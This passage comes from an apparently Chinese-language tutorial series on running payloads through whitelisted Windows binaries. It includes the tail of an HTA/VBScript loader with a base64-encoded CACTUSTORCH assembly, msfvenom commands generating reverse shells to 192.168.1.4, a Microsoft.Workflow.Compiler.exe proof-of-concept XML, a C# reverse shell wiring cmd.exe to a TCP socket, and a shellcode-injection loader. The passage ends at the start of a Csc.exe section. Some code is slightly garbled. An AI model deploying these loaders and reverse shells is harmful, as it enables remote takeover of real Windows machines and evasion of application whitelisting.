&#x3D; s &amp; &quot;dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJh&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ZGVtYXJrQXR0cmlidXRlAGR3RmlsbEF0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmli&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;dXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;cmlidXRlAEZsYWdzQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNz&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBkd1hTaXplAGR3&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;WVNpemUAZHdTdGFja1NpemUAZHdTaXplAFNpemVPZgBHVUFSRF9Nb2RpZmllcmZsYWcATk9DQUNI&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;RV9Nb2RpZmllcmZsYWcAV1JJVEVDT01CSU5FX01vZGlmaWVyZmxhZwBGcm9tQmFzZTY0U3RyaW5n&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AFRvU3RyaW5nAGNhY3R1c1RvcmNoAGdldF9MZW5ndGgATWFyc2hhbABrZXJuZWwzMi5kbGwAQ0FD&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;VFVTVE9SQ0guZGxsAFN5c3RlbQBFbnVtAGxwTnVtYmVyT2ZCeXRlc1dyaXR0ZW4AbHBQcm9jZXNz&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;SW5mb3JtYXRpb24AU3lzdGVtLlJlZmxlY3Rpb24ATWVtb3J5UHJvdGVjdGlvbgBscFN0YXJ0dXBJ&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;bmZvAFplcm8AbHBEZXNrdG9wAGJ1ZmZlcgBscFBhcmFtZXRlcgBoU3RkRXJyb3IALmN0b3IAbHBT&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ZWN1cml0eURlc2NyaXB0b3IASW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGlt&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dp&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;bmdNb2RlcwBiSW5oZXJpdEhhbmRsZXMAbHBUaHJlYWRBdHRyaWJ1dGVzAGxwUHJvY2Vzc0F0dHJp&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;YnV0ZXMAU2VjdXJpdHlBdHRyaWJ1dGVzAGR3Q3JlYXRpb25GbGFncwBDcmVhdGVQcm9jZXNzRmxh&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;Z3MAZHdGbGFncwBEdXBsaWNhdGVPcHRpb25zAGR3WENvdW50Q2hhcnMAZHdZQ291bnRDaGFycwBU&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ZXJtaW5hdGVQcm9jZXNzAGhQcm9jZXNzAGxwQmFzZUFkZHJlc3MAbHBBZGRyZXNzAGxwU3RhcnRB&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ZGRyZXNzAENvbmNhdABPYmplY3QAZmxQcm90ZWN0AGxwRW52aXJvbm1lbnQAQ29udmVydABoU3Rk&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;SW5wdXQAaFN0ZE91dHB1dAB3U2hvd1dpbmRvdwBWaXJ0dWFsQWxsb2NFeABiaW5hcnkAV3JpdGVQ&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;cm9jZXNzTWVtb3J5AGxwQ3VycmVudERpcmVjdG9yeQBvcF9FcXVhbGl0eQBvcF9JbmVxdWFsaXR5&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAABABlQAHIAbwBnAHIAYQBtAFcANgA0ADMAMgAADXcAaQBuAGQAaQByAAAVXABTAHkAcwBX&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AE8AVwA2ADQAXAAAFVwAUwB5AHMAdABlAG0AMwAyAFwAAAMwAAAARY+bzuLqxE+aSSAzLsphXgAE&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;IAEBCAMgAAEFIAEBEREEIAEBDgQgAQECDgcJHQUYEhwREA4YGAgYBQABHQUOBAABDg4DIAAIBgAD&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;Dg4ODgIGGAMgAA4FAAICDg4EAAEIHAi3elxWGTTgiQQBAAAABAIAAAAEBAAAAAQIAAAABBAAAAAE&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;IAAAAARAAAAABIAAAAAEAAEAAAQAAgAABAAEAAAEAAgAAAQAEAAABAAgAAAEAEAAAAQAgAAABAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AQAEAAACAAQAAAQABAAACAAEAAAQAAQAACAABAAAAAEEAAAAAgQAAAAEBAAAAAgEAAAAEAQAAAAg&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;BAAAAEAEAAAAgAQAMAAABAAAQAACBggCBgICBgkDBhEUAwYRGAIGBgMGESADBhEkEwAKGA4OEgwS&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;DAIRFBgOEhwQERAKAAUYGBgYESARJAkABQIYGB0FGAgFAAICGAkKAAcYGBgJGBgJGAUgAgEODggB&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAAQAQALQ0FDVFVT&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;VE9SQ0gAAAUBAAAAAAUBAAEAACkBACQ1NjU5OGYxYy02ZDg4LTQ5OTQtYTM5Mi1hZjMzN2FiZTU3&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;NzcAAAwBAAcxLjAuMC4wAAAASDUAAAAAAAAAAAAAYjUAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AFQ1AAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAANAMAAAAAAAAAAAAANAM0AAAAVgBTAF8A&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;VgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7&#x2F;4AAAEAAAABAAAAAAAAAAEAAAAAAD8AAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;BAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBJQCAAABAFMAdAByAGkAbgBnAEYAaQBs&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AGUASQBuAGYAbwAAAHACAAABADAAMAAwADAAMAA0AGIAMAAAADAADAABAEMAbwBtAG0AZQBuAHQA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;cwAAAEMAQQBDAFQAVQBTAFQATwBSAEMASAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAEAADAABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABDAEEAQwBUAFUA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;UwBUAE8AUgBDAEgAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAu&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ADAAAABAABAAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEMAQQBDAFQAVQBTAFQATwBSAEMA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;SAAuAGQAbABsAAAAPAAMAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBBAEMAVABV&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AFMAVABPAFIAQwBIAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AABIABAAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAQwBBAEMAVABVAFMAVABP&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AFIAQwBIAC4AZABsAGwAAAA4AAwAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEMAQQBDAFQA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;VQBTAFQATwBSAEMASAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAw&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;LgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAADAAAAwAAAB0NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVmbGVjdGlv&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;bi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA&quot;</span><br><span class="line">entry_class &#x3D; &quot;cactusTorch&quot;</span><br><span class="line"></span><br><span class="line">Dim fmt, al, d, o</span><br><span class="line">Set fmt &#x3D; CreateObject(&quot;System.Runtime.Serialization.Formatters.Binary.BinaryFormatter&quot;)</span><br><span class="line">Set al &#x3D; CreateObject(&quot;System.Collections.ArrayList&quot;)</span><br><span class="line">al.Add fmt.SurrogateSelector</span><br><span class="line"></span><br><span class="line">Set d &#x3D; fmt.Deserialize_2(Base64ToStream(s))</span><br><span class="line">Set o &#x3D; d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)</span><br><span class="line">o.flame binary,code</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">SetVersion</span><br><span class="line">On Error Resume Next</span><br><span class="line">Run</span><br><span class="line">If Err.Number &lt;&gt; 0 Then</span><br><span class="line">  Debug Err.Description</span><br><span class="line">  Err.Clear</span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">self.close</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>


<h2 id="76-基于白名单Compiler-exe执行payload第六季"><a href="#76-基于白名单Compiler-exe执行payload第六季" class="headerlink" title="76.  基于白名单Compiler.exe执行payload第六季"></a>76.  基于白名单Compiler.exe执行payload第六季</h2><ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe poc.xml Micropoor.tcp</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>payload</strong>生成</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom ‐p windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp LHOST&#x3D;192.168.1.4 LPORT&#x3D;53 ‐ f csharp</span><br></pre></td></tr></table></figure>
<ul>
<li>附录：poc.xml [注：<strong>windows/shell/reverse_tcp</strong> ]</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf‐8&quot;?</span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line"><span class="meta">&lt;CompilerInput xmlns:i=&quot;http://www.w3.org/2001/XMLSchema‐instance&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler&quot;</span></span><br><span class="line"><span class="meta">	&lt;files xmlns:d2p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot;&gt;</span></span><br><span class="line"><span class="meta">		&lt;d2p1:string&gt;Micropoor.tcp&lt;/d2p1:string&gt;</span></span><br><span class="line"><span class="meta">	&lt;/files&gt;</span></span><br><span class="line"><span class="meta">	&lt;parameters xmlns:d2p1=&quot;http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler&quot;</span></span><br><span class="line"><span class="meta">		&lt;assemblyNames xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;compilerOptions i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;coreAssemblyFileName xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt; &lt;/coreAssemblyFileName&gt;</span></span><br><span class="line"><span class="meta">		&lt;embeddedResources xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;evidence xmlns:d3p1=&quot;http://schemas.datacontract.org/2004/07/System.Security.Policy&quot; i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;generateExecutable xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;false&lt;/generateExecutable&gt;</span></span><br><span class="line"><span class="meta">		&lt;generateInMemory xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;true&lt;/generateInMemory&gt;</span></span><br><span class="line"><span class="meta">		&lt;includeDebugInformation xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;false&lt;/includeDebugInformation&gt;</span></span><br><span class="line"><span class="meta">		&lt;linkedResources xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;mainClass i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;outputName xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt; &lt;/outputName&gt;</span></span><br><span class="line"><span class="meta">		&lt;tempFiles i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;treatWarningsAsErrors xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;false&lt;/treatWarningsAsErrors&gt;</span></span><br><span class="line"><span class="meta">		&lt;warningLevel xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;‐ 1&lt;/warningLevel&gt;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		&lt;win32Resource i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;d2p1:checkTypes&gt;false&lt;/d2p1:checkTypes&gt;</span></span><br><span class="line"><span class="meta">		&lt;d2p1:compileWithNoCode&gt;false&lt;/d2p1:compileWithNoCode&gt;</span></span><br><span class="line"><span class="meta">		&lt;d2p1:compilerOptions i:nil=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;d2p1:generateCCU&gt;false&lt;/d2p1:generateCCU&gt;</span></span><br><span class="line"><span class="meta">		&lt;d2p1:languageToUse&gt;CSharp&lt;/d2p1:languageToUse&gt;</span></span><br><span class="line"><span class="meta">		&lt;d2p1:libraryPaths xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; i:nil=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;d2p1:localAssembly xmlns:d3p1=&quot;http://schemas.datacontract.org/2004/07/System.Reflection&quot; i:nil=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;d2p1:mtInfo i:nil=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="meta">		&lt;d2p1:userCodeCCUs xmlns:d3p1=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom&quot; i:nil=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="meta">	&lt;/parameters&gt;</span></span><br><span class="line"><span class="meta">&lt;/CompilerInput&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Micropoor.tcp</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.ComponentModel;</span><br><span class="line">using System.Net;</span><br><span class="line">using System.Net.Sockets;</span><br><span class="line">using System.Workflow.Activities;</span><br><span class="line">public class Program : SequentialWorkflowActivity </span><br><span class="line">&#123;</span><br><span class="line">	static StreamWriter streamWriter;</span><br><span class="line">	public Program() </span><br><span class="line">	&#123;</span><br><span class="line">		using(TcpClient client &#x3D; new TcpClient(&quot;4&quot;, 53)) </span><br><span class="line">		&#123;</span><br><span class="line">			using(Stream stream &#x3D; client.GetStream()) </span><br><span class="line">			&#123;</span><br><span class="line">				using(StreamReader rdr &#x3D; new StreamReader(stream)) </span><br><span class="line">				&#123;</span><br><span class="line">					streamWriter &#x3D; new StreamWriter(stream);</span><br><span class="line">					StringBuilder strInput &#x3D; new StringBuilder();</span><br><span class="line">					Process p &#x3D; new Process();</span><br><span class="line">					p.StartInfo.FileName &#x3D; &quot;cmd.exe&quot;;</span><br><span class="line">					p.StartInfo.CreateNoWindow &#x3D; true;</span><br><span class="line">					p.StartInfo.UseShellExecute &#x3D; false;</span><br><span class="line">					p.StartInfo.RedirectStandardOutput &#x3D; true;</span><br><span class="line">					p.StartInfo.RedirectStandardInput &#x3D; true;</span><br><span class="line">					p.StartInfo.RedirectStandardError &#x3D; true;</span><br><span class="line">					p.OutputDataReceived +&#x3D; new DataReceivedEventHandler(CmdOutputDataHandler);</span><br><span class="line">					p.Start();</span><br><span class="line">					p.BeginOutputReadLine();</span><br><span class="line">					while(true) </span><br><span class="line">					&#123;</span><br><span class="line">						strInput.Append(rdr.ReadLine());</span><br><span class="line">						p.StandardInput.WriteLine(strInput);</span><br><span class="line">						strInput.Remove(0, strInput.Length);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine) </span><br><span class="line">	&#123;</span><br><span class="line">		StringBuilder strOutput &#x3D; new StringBuilder();</span><br><span class="line">		if (!String.IsNullOrEmpty(outLine.Data)) </span><br><span class="line">		&#123;</span><br><span class="line">			try </span><br><span class="line">			&#123;</span><br><span class="line">				strOutput.Append(outLine.Data);</span><br><span class="line">				streamWriter.WriteLine(strOutput);</span><br><span class="line">				streamWriter.Flush();</span><br><span class="line">			&#125;</span><br><span class="line">			catch (Exception err) </span><br><span class="line">			&#123;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Micropoor_rev1.cs 【注：<strong>x64 payload</strong>】</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Workflow.Activities;</span><br><span class="line">using System.Net;</span><br><span class="line">using System.Net.Sockets;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">using System.Threading;</span><br><span class="line">class yrDaTlg : SequentialWorkflowActivity </span><br><span class="line">&#123;</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)] private static extern IntPtr VirtualAlloc(UInt32 rCfMkmxRSAakg,UInt32 qjRsrljIMB, UInt32 peXiTuE, UInt32 AkpADfOOAVBZ);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)] public static extern bool VirtualProtect(IntPt rDStOGXQMMkP, uint CzzIpcuQppQSTBJ, uint JCFImGhkRqtwANx, out uint exgVp Sg);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)]private static extern IntPtr CreateThread(UInt32 eisuQbXKYbAvA, UInt32 WQATOZaFz, IntPtr AEGJQOn,IntPtr SYcfyeeSgPl, UInt32 ZSheqBwKtDf, ref UInt32 SZtdSB);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)] private static extern UInt32 WaitForSingleObject(IntPtr KqJNFlHpsKOV, UInt32 EYBOArlCLAM);</span><br><span class="line">	public yrDaTlg() </span><br><span class="line">	&#123;</span><br><span class="line">		byte[] QWKpWKhcs &#x3D; &#123; your shellcode&#125;</span><br><span class="line">		IntPtr AmnGaO &#x3D; VirtualAlloc(0, (UInt32)QWKpWKhcs.Length, 0x3000, 0x04);</span><br><span class="line">		Marshal.Copy(QWKpWKhcs, 0, (IntPtr)(AmnGaO), QWKpWKhcs.Length);</span><br><span class="line">		IntPtr oXmoNUYvivZlXj &#x3D; IntPtr.Zero;</span><br><span class="line">		UInt32 XVXTOi &#x3D; 0;</span><br><span class="line">		IntPtr pAeCTf wBS &#x3D; IntPtr.Zero;</span><br><span class="line">		uint BnhanUiUJaetgy;</span><br><span class="line">		bool iSdNUQK &#x3D; VirtualProtect(AmnGaO, (uint)0x1000, (uint)0x20, out BnhanUiUJaetgy);</span><br><span class="line">		oXmoNUYvivZlXj &#x3D; CreateThread(0, 0, AmnGaO, pAeCTfwBS, 0, ref XVXTOi);</span><br><span class="line">		WaitForSingleObject(oXmoNUYvivZlXj, 0xFFFFFFFF);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="77-基于白名单Csc-exe执行payload第七季"><a href="#77-基于白名单Csc-exe执行payload第七季" class="headerlink" title="77. 基于白名单Csc.exe执行payload第七季"></a>77. 基于白名单Csc.exe执行payload第七季</h2><ul>
<li>配置payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom ‐p windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp LHOST&#x3D;192.168.1.4 LPORT&#x3D;53 ‐ f csharp</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
